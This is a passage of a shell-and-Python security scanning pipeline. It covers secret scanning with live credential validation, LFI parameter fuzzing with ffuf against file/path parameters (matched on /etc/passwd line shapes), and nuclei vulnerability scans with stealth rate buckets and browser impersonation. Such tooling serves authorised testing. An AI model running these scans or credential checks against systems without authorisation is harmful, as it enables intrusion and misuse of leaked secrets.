        sc = e.get("status_code") or 0
        if not (200 <= sc < 300): continue
        # httpx stores responses; the path can appear under several keys
        # depending on version. Try the common ones.
        rpath = e.get("stored_response_path") or e.get("response_path") or ""
        if not rpath or not os.path.isfile(rpath): continue
        # Filename: sha1(url)[:16].txt — collision-free and deterministic.
        url = e.get("url") or e.get("input") or rpath
        name = hashlib.sha1(url.encode("utf-8", errors="replace")).hexdigest()[:16] + ".txt"
        try:
            os.symlink(rpath, os.path.join(dst, name))
        except FileExistsError:
            pass
        except OSError:
            # Cross-fs / no-symlink-support fallback
            try:
                with open(rpath, "rb") as f: data = f.read()
                with open(os.path.join(dst, name), "wb") as f: f.write(data)
            except Exception:
                pass
        if index_fh:
            try:
                index_fh.write("%s\t%s\n" % (url, name))
            except Exception:
                pass
except FileNotFoundError:
    pass
finally:
    if index_fh:
        index_fh.close()
PY_STAGE_2XX
        local staged_count=$(find "$truffle_staged/http_responses_2xx" -type f -o -type l 2>/dev/null | wc -l | tr -d ' ')
        [ "$staged_count" -gt 0 ] && log_info "Staged $staged_count 2xx httpx body(ies) for secret scan"
    fi

    # Run trufflehog on the broader staged tree.
    if command -v trufflehog &>/dev/null; then
        scanner_status="completed"
        $TRUFFLEHOG filesystem "$truffle_staged" \
            --json --no-verification > "$secrets_jsonl" 2>"$OUTPUT_DIR/10_secret_scanning/trufflehog.stderr" || scanner_status="completed_with_findings"
        jq -s '[.[] | select(type == "object")]' "$secrets_jsonl" > "$secrets_file" 2>/dev/null || echo '[]' > "$secrets_file"
    else
        log_warn "trufflehog not installed, skipping"
        echo '[]' > "$secrets_file"
    fi
    
    local total_secrets=0
    total_secrets=$(jq 'length' "$secrets_file" 2>/dev/null || echo 0)

    log_info "Secrets found: $total_secrets"

    # --- Real-time safe validation of detected secrets -------------------------
    # TruffleHog only regex-matches; intel/secret_validator.py performs a read-only,
    # non-destructive liveness check per credential and grades it onto:
    #   invalid->info, valid_restricted->medium, valid->high,
    #   valid_customer_data->critical. Guardrails (read-only identity endpoints,
    #   no PII exfiltration, redaction, bounded, fail-safe) are enforced in the
    #   module. Set ARISE_SECRET_VALIDATE=0 to skip all outbound validation, or
    #   ARISE_SECRET_VALIDATE=offline for regex-only classification (zero calls).
    local validated_file="$OUTPUT_DIR/10_secret_scanning/secrets_validated.jsonl"
    local validation_summary="$OUTPUT_DIR/10_secret_scanning/validation_summary.json"
    local vstate="skipped"
    local validate_mode="${ARISE_SECRET_VALIDATE:-1}"
    if [ "$total_secrets" -gt 0 ] && [ "$validate_mode" != "0" ]; then
        local vscript="$PROJECT_ROOT/intel/secret_validator.py"
        [ ! -f "$vscript" ] && vscript="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/intel/secret_validator.py"
        if [ -f "$vscript" ] && command -v python3 &>/dev/null; then
            local vargs=(--input "$secrets_jsonl" --output "$validated_file"
                         --summary "$validation_summary"
                         --audit "$OUTPUT_DIR/10_secret_scanning/validation_audit.log")
            [ "$validate_mode" = "offline" ] && vargs+=(--no-network)
            log_info "Validating secrets (mode=$validate_mode)..."
            if python3 "$vscript" "${vargs[@]}" 2>"$OUTPUT_DIR/10_secret_scanning/validator.stderr"; then
                vstate="completed"
                local vcrit vhigh
                vcrit=$(jq -r '.critical // 0' "$validation_summary" 2>/dev/null || echo 0)
                vhigh=$(jq -r '.high // 0' "$validation_summary" 2>/dev/null || echo 0)
                log_info "  Validation: $vcrit critical (live+customer data), $vhigh high (live)"
            else
                vstate="error"
                log_warn "  intel/secret_validator.py returned non-zero; dashboard will fall back to raw findings"
            fi
        else
            log_warn "  intel/secret_validator.py or python3 missing; skipping validation"
        fi
    fi

    # --- Module 10.1: arise_nlp deep content scan -----------------------------
    # trufflehog (above) finds SECRETS only. Run the ARISE NLP detectors — the
    # same engine Module 26 runs over live responses — across the SAME staged
    # tree (JS bundles, source maps, staged 2xx bodies, .env/config). This adds
    # PII (phone/email/SSN/CC) + info-disclosure (internal IPs, stack traces,
    # sensitive comments, debug flags) + a second secret opinion that
    # trufflehog's detectors don't cover. Output: nlp_findings.jsonl.
    # No --region is passed on purpose: bare numeric IDs must not be mistaken
    # for phone numbers (region-hinted validation would re-introduce that FP).
    local nlp_findings="$OUTPUT_DIR/10_secret_scanning/nlp_findings.jsonl"
    local nlp_count=0
    if command -v python3 &>/dev/null; then
        local nlpscript="$PROJECT_ROOT/ai/arise_nlp.py"
        [ ! -f "$nlpscript" ] && nlpscript="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/ai/arise_nlp.py"
        if [ -f "$nlpscript" ] && [ -d "$truffle_staged" ]; then
            log_info "Module 10.1: arise_nlp content scan (PII + disclosure + secrets) over staged files..."
            python3 "$nlpscript" --scan-dir "$truffle_staged" --base "$truffle_staged" \
                --out "$nlp_findings" 2>"$OUTPUT_DIR/10_secret_scanning/arise_nlp.stderr" || \
                log_warn "  arise_nlp content scan returned non-zero (partial output may exist)"
            [ -f "$nlp_findings" ] && nlp_count=$(count_lines "$nlp_findings")
            log_info "  arise_nlp: $nlp_count content finding(s) (see nlp_findings.jsonl)"
            update_statistics "nlp_content_findings" "$nlp_count"
        fi
    fi

    # --- Module 10.2: JS-referenced host/API extraction ----------------------
    # Passively extracts absolute URLs from the SAME staged JS corpus (no
    # extra HTTP requests) and surfaces same-organization hosts referenced
    # in the bundle but never targeted by this scan — e.g. a CDN-fronted
    # static asset host's checkout-widget JS hardcoding api.<org>.com,
    # admin-dashboard.<org>.com, etc. Scope-safe: only same-eTLD+1 hosts are
    # surfaced (never scanned), known third-party SaaS/CDN domains excluded.
    # Output feeds history/ledger.py's 'subdomains' store, so candidates
    # flow into the standard new_targets.json / dashboard pipeline.
    local js_hosts_count=0
    if command -v python3 &>/dev/null; then
        local jsxscript="$PROJECT_ROOT/discovery/js_endpoint_extract.py"
        [ ! -f "$jsxscript" ] && jsxscript="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/discovery/js_endpoint_extract.py"
        if [ -f "$jsxscript" ] && [ -d "$truffle_staged/js_downloads" ]; then
            log_info "Module 10.2: extracting same-org hosts referenced in staged JS..."
            python3 "$jsxscript" --scan-dir "$OUTPUT_DIR" --target "$target" \
                2>"$OUTPUT_DIR/10_secret_scanning/js_endpoint_extract.stderr" || \
                log_warn "  js_endpoint_extract returned non-zero (partial output may exist)"
            local js_hosts_file="$OUTPUT_DIR/10.2_js_endpoints/js_referenced_hosts.jsonl"
            [ -f "$js_hosts_file" ] && js_hosts_count=$(count_lines "$js_hosts_file")
            log_info "  js_endpoint_extract: $js_hosts_count candidate same-org host(s) (see 10.2_js_endpoints/)"
            update_statistics "js_referenced_hosts" "$js_hosts_count"
        fi
    fi

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "secret_scanning",
  "secrets_found": $total_secrets,
  "nlp_content_findings": $nlp_count,
  "nlp_findings_file": "nlp_findings.jsonl",
  "js_referenced_hosts": $js_hosts_count,
  "js_referenced_hosts_file": "../10.2_js_endpoints/js_referenced_hosts.jsonl",
  "scanner": "trufflehog",
  "scanner_status": "$scanner_status",
  "findings_file": "secrets.json",
  "validation_status": "$vstate",
  "validated_file": "secrets_validated.jsonl",
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "Secret scanning completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 11: PARAMETER FUZZING
###################################################################################################

module_param_fuzzing() {
    local target="$1"
    log_section "MODULE 11: Parameter Fuzzing"
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/11_param_fuzzing/$(make_iso_filename "$target" "param_fuzzing" "results")"
    
    local pf_dir="$OUTPUT_DIR/11_param_fuzzing"
    local urls_file="$OUTPUT_DIR/09_crawling/all_urls.txt"
    local routing_file="$OUTPUT_DIR/08_directory_discovery/attack_routing.jsonl"
    local input_fns="$OUTPUT_DIR/20_api_deep_discovery/input_functions.jsonl"
    local js_param_candidates="$OUTPUT_DIR/09_crawling/js_param_candidates.txt"
    local param_urls="$pf_dir/param_urls.txt"
    local candidates_file="$pf_dir/fuzz_candidates.tsv"
    local results_json="$pf_dir/lfi_results.json"
    local scanner_status="unavailable"
    : > "$candidates_file"

    log_info "Selecting LFI targets from classified inputs (attack_routing ssti-lfi lane + input fields)…"

    # Deep-chained target selection. Instead of fuzzing every ?param= on every
    # crawled URL, consume the URL-Inventory classification (Module 8B) and the
    # CDP-discovered input fields (Module 20.2), and fuzz ONLY parameters whose
    # NAME selects a file/path/include — the only params LFI can act on. This is
    # what removes the volume ("scans all URLs") and the bulk of the false
    # positives. Falls back to the crawl (still param-filtered) on older scans.
    python3 - "$candidates_file" "$param_urls" "$PARAM_FUZZ_MAX_URLS" \
              "$routing_file" "$input_fns" "$urls_file" "$js_param_candidates" << 'PYTHON_EOF'
import json, re, sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

cand_out, param_out, limit = sys.argv[1], sys.argv[2], int(sys.argv[3])
routing_file, input_fns_file, all_urls_file, js_params_file = sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7]

# Params that plausibly select a FILE / PATH / INCLUDE — the LFI-actionable set.
# Fuzzing utm_source/ref/id/page-number params only burns budget and fabricates
# false positives, so they are skipped entirely.
LFI_PARAM_RE = re.compile(
    r"^(?:file|filename|filepath|path|page|pg|include|inc|require|doc|document|"
    r"folder|dir|directory|download|dl|read|load|view|template|tpl|layout|pdf|"
    r"report|log|conf|config|cfg|module|mod|action|item|cat|style|theme|content|"
    r"resource|lang|locale|site|src|source|attachment|media|image|img)$", re.I)

# discovery/js_param_miner.py (Module 9) mines param names actually hardcoded
# in this target's OWN JS bundles — names LFI_PARAM_RE's generic list can't
# anticipate (e.g. a target-specific "reportFile" or "docPath"). Fold them
# into the same file/path-shaped whitelist so a crawled URL carrying one of
# these gets selected too, exactly as the miner's docstring intends.
try:
    _js_names = {ln.strip().lower() for ln in open(js_params_file, errors="ignore") if ln.strip()}
except FileNotFoundError:
    _js_names = set()

def _is_lfi_param(name):
    n = (name or "").lower()
    return bool(LFI_PARAM_RE.match(n)) or n in _js_names

seen = set()
rows = []   # (method, param, fuzz_url, post_data)

def add_query_target(url):
    try:
        parts = urlsplit(url)
    except Exception:
        return
    params = parse_qsl(parts.query, keep_blank_values=True)
    for i, (name, _) in enumerate(params):
        if not _is_lfi_param(name):
            continue
        key = ("GET", parts.netloc.lower(), parts.path, name.lower())
        if key in seen:
            continue
        seen.add(key)
        fuzzed = list(params); fuzzed[i] = (name, "FUZZ")
        fuzz_url = urlunsplit((parts.scheme, parts.netloc, parts.path,
                               urlencode(fuzzed), ""))
        rows.append(("GET", name, fuzz_url, ""))

# 1) Primary: the classified LFI/SQLi query-param lanes (in-scope, deduped).
routed = 0
try:
    for line in open(routing_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            r = json.loads(line)
        except Exception:
            continue
        if r.get("attack") not in ("ssti-lfi", "sqli"):
            continue
        u = r.get("url") or r.get("template") or ""
        if "?" in u and "=" in u:
            add_query_target(u); routed += 1
except FileNotFoundError:
    pass

# 2) Real input fields (forms/uploads) — includes POST. A form param that names
#    a file/path selector is a first-class LFI target the crawl never carries.
inputs = 0
try:
    for line in open(input_fns_file, errors="ignore"):
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except Exception:
            continue
        action = rec.get("url") or rec.get("action") or ""
        if not action:
            continue
        method = (rec.get("method") or "GET").upper()
        params = [p for p in (rec.get("params") or []) if p]
        lfi_params = [p for p in params if _is_lfi_param(p)]
        for name in lfi_params:
            try:
                p = urlsplit(action)
            except Exception:
                continue
            key = (method, p.netloc.lower(), p.path, name.lower())
            if key in seen:
                continue
            seen.add(key)
            kv = [(q, "FUZZ" if q == name else "1") for q in params] or [(name, "FUZZ")]
            if method in ("POST", "PUT", "PATCH"):
                base = urlunsplit((p.scheme, p.netloc, p.path, "", ""))
                rows.append((method, name, base, urlencode(kv)))
            else:
                fuzz_url = urlunsplit((p.scheme, p.netloc, p.path, urlencode(kv), ""))
                rows.append(("GET", name, fuzz_url, ""))
            inputs += 1
except FileNotFoundError:
    pass

# 3) Fallback ONLY when the classifier produced nothing (older scans): the crawl,
#    still filtered to file/path params.
if not rows:
    try:
        with open(param_out, "w") as pf:
            for raw in open(all_urls_file, errors="ignore"):
                url = raw.strip()
                if "?" not in url or "=" not in url:
                    continue
                pf.write(url + "\n")
                add_query_target(url)
    except FileNotFoundError:
        pass

with open(cand_out, "w") as dst:
    for method, name, fuzz_url, post_data in rows[:limit]:
        dst.write(f"{method}\t{name}\t{fuzz_url}\t{post_data}\n")
sys.stderr.write(
    f"[lfi-select] {min(len(rows), limit)} target(s) — {routed} from routed "
    f"query-param lanes, {inputs} from input fields; params filtered to "
    f"file/path selectors\n")
PYTHON_EOF

    local param_count=$(count_lines "$candidates_file")
    log_info "LFI candidates (file/path params only): $param_count"

    # FP-hardened matcher: require a REAL /etc/passwd line shape
    # (user:x:uid:gid:) or a Windows ini/boot signature — NOT the bare substrings
    # "root:" / "passwd" / "etc/passwd" (those matched documentation, JSON, and
    # REFLECTED payloads, which was the false-positive engine). A reflected
    # "/etc/passwd" value cannot satisfy the numeric uid:gid: structure.
    local LFI_MATCH_RE='(root|daemon|bin|sys|www-data|nobody):[^:]*:[0-9]+:[0-9]+:|\[boot loader\]|\[fonts\]|for 16-bit app support'

    # One parameter is changed per request, preserving the other parameter values.
    if command -v "$FFUF" &>/dev/null && [ -s "$WORDLIST_DIR/LFI-Jhaddix.txt" ] && [ -s "$candidates_file" ]; then
        log_info "Running ffuf LFI fuzzing (GET query + POST input fields, hardened matcher)…"
        scanner_status="completed"
        local ffuf_dir="$pf_dir/ffuf"
        mkdir -p "$ffuf_dir"
        local result_files="$pf_dir/result_files.txt"
        > "$result_files"
        while IFS=$'\t' read -r method parameter fuzz_url post_data; do
            [ -z "$fuzz_url" ] && continue
            [ -z "$method" ] && method="GET"
            local result_id=$(printf '%s|%s|%s' "$method" "$fuzz_url" "$post_data" | md5sum | cut -d' ' -f1)
            local result_file="$ffuf_dir/${result_id}.json"
            if [ "$method" = "GET" ] || [ -z "$post_data" ]; then
                run_tool ffuf "$FFUF" -u "$fuzz_url" \
                    -w "$WORDLIST_DIR/LFI-Jhaddix.txt" \
                    -mr "$LFI_MATCH_RE" \
                    -t 40 -ac \
                    -of json -o "$result_file" -s || true
            else
                run_tool ffuf "$FFUF" -u "$fuzz_url" -X "$method" \
                    -d "$post_data" \
                    -H "Content-Type: application/x-www-form-urlencoded" \
                    -w "$WORDLIST_DIR/LFI-Jhaddix.txt" \
                    -mr "$LFI_MATCH_RE" \
                    -t 40 -ac \
                    -of json -o "$result_file" -s || true
            fi
            printf '%s\n' "$result_file" >> "$result_files"
        done < "$candidates_file"
        if [ -s "$result_files" ]; then
            python3 - "$result_files" "$results_json" << 'PYTHON_EOF'
import json
import sys
from pathlib import Path

result_files = [line.strip() for line in Path(sys.argv[1]).read_text().splitlines() if line.strip()]
combined = []
for file_path in result_files:
    try:
        with open(file_path, "r", errors="ignore") as handle:
            payload = json.load(handle)
    except Exception:
        continue
    combined.extend(payload.get("results", []))

with open(sys.argv[2], "w") as out:
    json.dump(combined, out)
PYTHON_EOF
        else
            echo '[]' > "$results_json"
        fi
        local lfi_hits=$(jq 'length' "$results_json" 2>/dev/null || echo 0)
        log_info "LFI hits: $lfi_hits"
    else
        echo '[]' > "$results_json"
        log_warn "ffuf, LFI wordlist, or parameter candidates unavailable; active fuzzing skipped"
    fi
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "param_fuzzing",
  "lfi_candidates": $param_count,
  "fuzz_candidates": $(count_lines "$candidates_file"),
  "lfi_findings": $(jq 'length' "$results_json" 2>/dev/null || echo 0),
  "target_selection": "classified (attack_routing ssti-lfi lane + input fields, file/path params only)",
  "scanner_status": "$scanner_status",
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "Parameter fuzzing completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 12: NUCLEI VULNERABILITY SCANNING (Dual-Phase)
###################################################################################################

module_nuclei_scan() {
    local target="$1"
    log_section "MODULE 12: Nuclei Vulnerability Scanning"

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/12_nuclei_scanning/$(make_iso_filename "$target" "nuclei_scan" "results")"

    local http_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    [ ! -f "$http_hosts_file" ] && { log_info "No HTTP hosts"; return 0; }

    # ── Wall-clock caps (seconds) ─────────────────────────────────────────────
    # Without these, a 42-host target with 527k source URLs can run nuclei for
    # 12+ hours. -max-time is nuclei v3's own graceful shutdown (it finishes
    # in-flight requests, writes partial results). run_tool_timeout is the hard
    # kill if nuclei itself hangs.
    local PHASE1_MAX="${NUCLEI_PHASE1_MAX_TIME:-2400}"    # 40 min host scan
    local DEEP_MAX="${NUCLEI_DEEP_MAX_TIME:-3600}"        # 60 min deep URL scan
    local NET_MAX="${NUCLEI_NET_MAX_TIME:-900}"            # 15 min network scan

    local host_policy_file="$OUTPUT_DIR/05_waf_detection/host_rate_policy.jsonl"

    _bucket_urls_by_policy() {
        local in="$1"; local prefix="$2"
        : > "${prefix}.aggressive.txt"; : > "${prefix}.stealth.txt"
        : > "${prefix}.minimal.txt"; : > "${prefix}.probe.txt"
        [ ! -s "$in" ] && return 0
        python3 - "$in" "$host_policy_file" "$prefix" << 'PY_BUCKET' 2>/dev/null || true
import json, sys
from urllib.parse import urlsplit
in_file, policy_file, prefix = sys.argv[1], sys.argv[2], sys.argv[3]
pol = {}
try:
    for line in open(policy_file, errors="ignore"):
        line = line.strip()
        if not line: continue
        try: r = json.loads(line)
        except Exception: continue
        h = (r.get("host") or "").lower()
        if h: pol[h] = r.get("policy", "aggressive")
except FileNotFoundError:
    pass
outs = {
    "aggressive": open(prefix + ".aggressive.txt", "w"),
    "stealth":    open(prefix + ".stealth.txt", "w"),
    "minimal":    open(prefix + ".minimal.txt", "w"),
    "probe-only": open(prefix + ".probe.txt", "w"),
}
for line in open(in_file, errors="ignore"):
    line = line.strip()
    if not line: continue
    try:
        p = urlsplit(line if "://" in line else "https://" + line)
        h = (p.hostname or "").lower()
    except Exception:
        h = ""
    outs.get(pol.get(h, "aggressive"), outs["aggressive"]).write(line + "\n")
for fh in outs.values(): fh.close()
PY_BUCKET
    }
    _rate_for_policy() {
        case "$1" in
            aggressive) echo "300 50" ;;
            stealth)    echo "30 5"   ;;
            minimal)    echo "15 3"   ;;
            probe-only) echo "10 2"   ;;
            *)          echo "300 50" ;;
        esac
    }

    local host_count=$(count_lines "$http_hosts_file")
    log_info "Scanning $host_count hosts with nuclei..."

    local nd12="$OUTPUT_DIR/12_nuclei_scanning"
    mkdir -p "$nd12"
    local nuclei_results="$nd12/nuclei_results.txt"
    > "$nuclei_results"

    if ! command -v nuclei &>/dev/null; then
        log_warn "nuclei not installed, skipping"
        _nuclei_finish "$nuclei_results" "$output_file" "$start_time"
        return 0
    fi

    # ── SCAN 1: Host-level vulnerability scan (tech-detected) ─────────────
    # -as makes nuclei wappalyzer-detect each host's tech and select ONLY the
    # matching templates (CVEs, exposures, default-logins). This is the primary
    # scan — it covers everything the old broad-tag scan did, but loads 10-50
    # templates per host instead of thousands.
    # No -t flag needed: nuclei's default community templates are sufficient.
    log_info "── Scan 1/3: Host-level tech-detected scan (-as) ──"
    _bucket_urls_by_policy "$http_hosts_file" "$nd12/.phase1_buckets"
    local _nuclei_extra=(-H "User-Agent: $HUMAN_USER_AGENT")
    local _cookie_hdr=$(session_cookie_header)
    [ -n "$_cookie_hdr" ] && _nuclei_extra+=(-H "Cookie: $_cookie_hdr")
    [ -n "$TLS_IMPERSONATE_FLAG" ] && _nuclei_extra+=("$TLS_IMPERSONATE_FLAG")
    for pol in aggressive stealth minimal probe-only; do
        local bucket_file
        case "$pol" in
            probe-only) bucket_file="$nd12/.phase1_buckets.probe.txt" ;;
            *)          bucket_file="$nd12/.phase1_buckets.${pol}.txt" ;;
        esac
        [ ! -s "$bucket_file" ] && continue
        local rt tt; read rt tt <<< "$(_rate_for_policy "$pol")"
        log_info "Scan 1 [$pol]: $(count_lines "$bucket_file") hosts @ rl=$rt c=$tt (cap ${PHASE1_MAX}s)"
        run_tool_timeout "$PHASE1_MAX" nuclei_hosts $NUCLEI -l "$bucket_file" \
            -as \
            -severity low,medium,high,critical \
            "${_nuclei_extra[@]}" \
            -o "$nuclei_results" -j -rl "$rt" -c "$tt" \
            -max-time "${PHASE1_MAX}s" -duc || true
    done
    local phase1_count=$(count_lines "$nuclei_results")
    log_info "Scan 1 findings: $phase1_count"
    rm -f "$nd12/.phase1_buckets".*.txt

    # ── SCAN 2: Deep-surface URL scan (consolidated endpoints) ────────────
    # Scans every crawled/discovered URL. This was the 12+ hour bottleneck:
    # it used broad tags against up to 8000 URLs with no time cap.
    #
    # Fixes applied:
    #   a) Cap reduced from 8000 → 3000 (diminishing returns past ~2k unique
    #      template-collapsed paths — the 3001st URL is a near-duplicate).
    #   b) Uses -as (tech-detected) instead of broad tags — nuclei loads only
    #      the templates relevant to each URL's host tech, not the full tree.
    #   c) -max-time enforces a hard wall-clock cap so deep never dominates.
    #   d) Pre-nuclei httpx validation drops stale/dead URLs before scanning.
    log_info "── Scan 2/3: Deep-surface URL scan ──"
    local nuclei_url_tmp="$nd12/.nuclei_url_scan.tmp.txt"
    local consolidator="$PROJECT_ROOT/discovery/nuclei_url_consolidator.py"
    local deep_cap="${NUCLEI_DEEP_URL_CAP:-3000}"
    if [ -f "$consolidator" ] && command -v python3 &>/dev/null; then
        python3 "$consolidator" "$OUTPUT_DIR" \
            --out "$nuclei_url_tmp" \
            --cap "$deep_cap" \
            --target-host "$target" \
            --stats 2>&1 | grep -E "^\[consolidator\]" | while read -r ln; do log_info "$ln"; done || true
    else
        : > "$nuclei_url_tmp"
        if [ -s "$OUTPUT_DIR/09_crawling/all_urls.txt" ]; then
            sort -u "$OUTPUT_DIR/09_crawling/all_urls.txt" | grep -E '^https?://' \
                | head -n "$deep_cap" > "$nuclei_url_tmp" 2>/dev/null || true
        fi
    fi

    # Pre-nuclei httpx: drop stale/dead URLs (gau/CDX paths never probed).
    if [ -s "$nuclei_url_tmp" ] && command -v "$HTTPX" &>/dev/null; then
        local pre_validated="$nd12/.nuclei_url_scan.validated.tmp.txt"
        local before_count=$(count_lines "$nuclei_url_tmp")
        log_info "Pre-nuclei httpx validation: $before_count URLs → filtering to live only"
        local _httpx_extra=(-H "User-Agent: $HUMAN_USER_AGENT")
        [ -n "$_cookie_hdr" ] && _httpx_extra+=(-H "Cookie: $_cookie_hdr")
        [ -n "$TLS_IMPERSONATE_FLAG" ] && _httpx_extra+=("$TLS_IMPERSONATE_FLAG")
        run_tool_timeout 300 httpx_prenuclei "$HTTPX" -l "$nuclei_url_tmp" \
            -mc 200,201,202,204,301,302,307,308,401,403,405,500,502,503 \
            "${_httpx_extra[@]}" \
            -threads 100 -timeout 8 -silent -no-color \
            -o "$pre_validated" 2>/dev/null || true
        if [ -s "$pre_validated" ]; then
            mv "$pre_validated" "$nuclei_url_tmp"
            local after_count=$(count_lines "$nuclei_url_tmp")
            log_info "Pre-nuclei validation: dropped $((before_count - after_count)) dead URLs; $after_count remain"
        else
            rm -f "$pre_validated"
            log_warn "Pre-nuclei validation empty — keeping consolidated list"
        fi
    fi
    if [ -s "$nuclei_url_tmp" ]; then
        local deep_count=$(count_lines "$nuclei_url_tmp")
        log_info "Deep scan: $deep_count consolidated URLs (cap ${DEEP_MAX}s)"
        : > "$nd12/deep_results.txt"
        _bucket_urls_by_policy "$nuclei_url_tmp" "$nd12/.deep_buckets"
        for pol in aggressive stealth minimal probe-only; do
            local dfile
            case "$pol" in
                probe-only) dfile="$nd12/.deep_buckets.probe.txt" ;;
                *)          dfile="$nd12/.deep_buckets.${pol}.txt" ;;
            esac
            [ ! -s "$dfile" ] && continue
            local drt dtt; read drt dtt <<< "$(_rate_for_policy "$pol")"
            log_info "Scan 2 [$pol]: $(count_lines "$dfile") URLs @ rl=$drt c=$dtt"
            run_tool_timeout "$DEEP_MAX" nuclei_deep $NUCLEI -l "$dfile" \
                -as \
                -severity low,medium,high,critical \
                "${_nuclei_extra[@]}" \
                -o "$nd12/deep_results.txt" -j -rl "$drt" -c "$dtt" \
                -max-time "${DEEP_MAX}s" -duc || true
        done
        [ -f "$nd12/deep_results.txt" ] && \
            cat "$nd12/deep_results.txt" >> "$nuclei_results" 2>/dev/null || true
        local deep_findings=$(count_lines "$nd12/deep_results.txt" 2>/dev/null || echo 0)
        log_info "Scan 2 findings: $deep_findings"
        rm -f "$nd12/.deep_buckets".*.txt
    else
        log_info "No URLs to deep-scan (consolidator produced empty list)"
    fi
    rm -f "$nuclei_url_tmp"

    # ── SCAN 3: Non-web port scan (network templates) ─────────────────────
    # SSH, Redis, MySQL, SMTP, etc. — host:port pairs that httpx confirmed
    # are NOT web services. Uses network/tcp tags only.
    log_info "── Scan 3/3: Non-web port scan (network templates) ──"
    local ports_json="$OUTPUT_DIR/14_port_scan/all_ports.jsonl"
    if [ -f "$ports_json" ]; then
        jq -r 'select(.host and .port) | "\(.host):\(.port)"' "$ports_json" 2>/dev/null \
            | sort -u > "$nd12/all_hostports.txt"
        : > "$nd12/web_hostports.txt"
        [ -f "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" ] && \
            jq -r 'select(.host and .port) | "\(.host):\(.port)"' \
                "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" 2>/dev/null \
                | sort -u > "$nd12/web_hostports.txt"
        grep -vxFf "$nd12/web_hostports.txt" "$nd12/all_hostports.txt" 2>/dev/null \
            | grep -vE ':(80|443)$' > "$nd12/nonweb_hostports.txt" || true
        if [ -s "$nd12/nonweb_hostports.txt" ]; then
            local net_count=$(count_lines "$nd12/nonweb_hostports.txt")
            log_info "Scan 3: $net_count non-web host:port pair(s) (cap ${NET_MAX}s)"
            run_tool_timeout "$NET_MAX" nuclei_network $NUCLEI -l "$nd12/nonweb_hostports.txt" \
                -tags network,tcp \
                -severity low,medium,high,critical \
                -o "$nd12/network_results.txt" \
                -j -rl 300 \
                -max-time "${NET_MAX}s" -duc || true
            [ -f "$nd12/network_results.txt" ] && \
                cat "$nd12/network_results.txt" >> "$nuclei_results" 2>/dev/null || true
            local net_findings=$(count_lines "$nd12/network_results.txt" 2>/dev/null || echo 0)
            log_info "Scan 3 findings: $net_findings"
        else
            log_info "No non-web ports discovered"
        fi
    fi

    # Historical symlink so downstream consumers find full_results.txt.
    cp "$nuclei_results" "$nd12/full_results.txt" 2>/dev/null || true

    _nuclei_finish "$nuclei_results" "$output_file" "$start_time"
    echo "$output_file"
}

_nuclei_finish() {
    local nuclei_results="$1" output_file="$2" start_time="$3"

    # Reflected-input false-positive re-check (evidence/nuclei_fp_filter.py) —
    # same guard as Module 17's cloud nuclei pass, applied here so any custom
    # ARISE/synth_ai-generated template with a word-matcher that happens to
    # echo its own probe path gets demoted before total_vulns/stats are
    # computed below. Degrades to a no-op if the file or python3 is missing.
    local fp_filter="$PROJECT_ROOT/evidence/nuclei_fp_filter.py"
    [ ! -f "$fp_filter" ] && fp_filter="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/evidence/nuclei_fp_filter.py"
    if [ -f "$fp_filter" ] && [ -s "$nuclei_results" ] && command -v python3 &>/dev/null; then
        python3 "$fp_filter" "$nuclei_results" 2>>"$OUTPUT_DIR/12_nuclei_scanning/nuclei_fp_filter.log" || true
    fi

    local total_vulns=0
    [ -f "$nuclei_results" ] && total_vulns=$(count_lines "$nuclei_results")

    local end_time=$(date +%s)
    local elapsed=$((end_time - start_time))
    log_info "Total vulnerabilities: $total_vulns (${elapsed}s elapsed)"

    if [ -f "$nuclei_results" ] && [ "$total_vulns" -gt 0 ]; then
        log_info "Sample vulnerabilities:"
        head -5 "$nuclei_results" | jq -r '"[\(.info.severity)] \(.info.name) - \(.host)"' 2>/dev/null || head -5 "$nuclei_results"
    fi

    update_statistics "total_vulnerabilities" "$total_vulns"

    cat > "$output_file" << EOF
{
  "module": "nuclei_scan",
  "total_vulnerabilities": $total_vulns,
  "duration_seconds": $elapsed
}
EOF
    log_info "Nuclei scanning completed"
}
###################################################################################################
# MODULE 13: XSS-SPECIFIC TESTING
###################################################################################################

###################################################################################################
# MODULE 8B: ENDPOINT CONSOLIDATION (discovery/endpoint_consolidator.py)
#
# Runs AFTER Module 20 (api_deep_discovery). Merges every URL the pipeline
# discovered — dirsearch brute-force hits, crawled links (gospider/katana),
# JS-extracted endpoints and the runtime XHR/fetch API calls intercepted by the
# headless browser — into ONE deduplicated, path-templated endpoint inventory
# (08_directory_discovery/discovered_endpoints.jsonl). NEW endpoints (no known
# status) are probed once with httpx. The directory-discovery dashboard view
# reads this merged file instead of only the raw dirsearch hits.
###################################################################################################

ENDPOINT_CONSOLIDATION_ENABLED="${ENDPOINT_CONSOLIDATION_ENABLED:-true}"
ENDPOINT_MAX_PROBE="${ENDPOINT_MAX_PROBE:-3000}"
ENDPOINT_SLUG_THRESHOLD="${ENDPOINT_SLUG_THRESHOLD:-40}"
# URL-Inventory classification: cap on OPTIONS method-probes (API-classed URLs
# only). Set to 0 / export ENDPOINT_NO_METHOD_PROBE=true to disable entirely.
ENDPOINT_MAX_METHOD_PROBE="${ENDPOINT_MAX_METHOD_PROBE:-800}"

module_endpoint_consolidation() {
    local target="$1"
    log_section "MODULE 8B: Endpoint Consolidation"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/08_directory_discovery"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "endpoint_consolidation" "results")"

